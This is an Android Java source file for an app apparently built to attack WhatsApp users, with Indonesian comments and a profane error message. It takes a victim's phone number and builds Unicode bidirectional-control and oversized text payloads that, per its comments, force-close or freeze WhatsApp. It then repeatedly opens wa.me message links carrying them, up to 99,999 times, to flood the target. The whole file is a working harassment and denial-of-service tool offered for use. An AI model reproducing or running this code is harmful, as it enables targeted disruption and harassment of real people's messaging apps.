package com.langz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.RadioGroup;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    EditText target, delayInput;
    CheckBox waBisnis;
    RadioGroup modeBug;
    Button kirim;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        target = findViewById(R.id.target);
        delayInput = findViewById(R.id.delay);
        waBisnis = findViewById(R.id.wa_bisnis);
        modeBug = findViewById(R.id.mode_bug);
        kirim  = findViewById(R.id.kirim);

        kirim.setOnClickListener(v -> {
            String nomor = target.getText().toString().trim();
            if (nomor.isEmpty()) {
                Toast.makeText(this, "Nomor target mana bangsat?", Toast.LENGTH_SHORT).show();
                return;
            }

            long jeda = 50;
            try {
                jeda = Long.parseLong(delayInput.getText().toString());
            } catch (Exception e) {}

            String paketWA = waBisnis.isChecked() ? "com.whatsapp.w4b" : "com.whatsapp";
            
            int selectedMode = modeBug.getCheckedRadioButtonId();
            String mode = "FC"; // default

            if (selectedMode == R.id.mode_fc) {
                mode = "FC";
            } else if (selectedMode == R.id.mode_lock) {
                mode = "LOCK";
            } else if (selectedMode == R.id.mode_delay) {
                mode = "DELAY";
                jeda = 0; // Paksa delay 0 buat mode brutal
            }

            eksekusiBug(nomor, paketWA, jeda, mode);
        });
    }

    private void eksekusiBug(String nomor, String paketWA, long jeda, String mode) {
        Handler h = new Handler(Looper.getMainLooper());
        
        // Setup payload berdasarkan mode
        StringBuilder sb = new StringBuilder();
        sb.append("\u202E\u202D\u202C\u200F\u200E");
        
        if (mode.equals("FC")) {
            // Force Close: Teks super panjang biar parser WA crash
            for (int i = 0; i < 50000; i++) sb.append("A");
        } else if (mode.equals("LOCK")) {
            // Lock Chat: Kombinasi Unicode aneh biar WA nge-freeze pas buka chat
            for (int i = 0; i < 15000; i++) sb.append("\u202E\u200F\u202D");
        } else if (mode.equals("DELAY")) {
            // Delay Hard: Teks medium, tapi spam tanpa jeda (0ms)
            for (int i = 0; i < 5000; i++) sb.append("B");
        }
        
        final String payload = sb.toString();

        Runnable r = new Runnable() {
            int count = 0;
            @Override
            public void run() {
                if (count >= 99999) return;
                
                try {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setPackage(paketWA);
                    i.setData(Uri.parse("https://wa.me/" + nomor + "?text=" + Uri.encode(payload + count)));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                } catch (Exception e) {}
                
                count++;
                h.postDelayed(this, jeda);
            }
        };
        h.post(r);
    }
            }
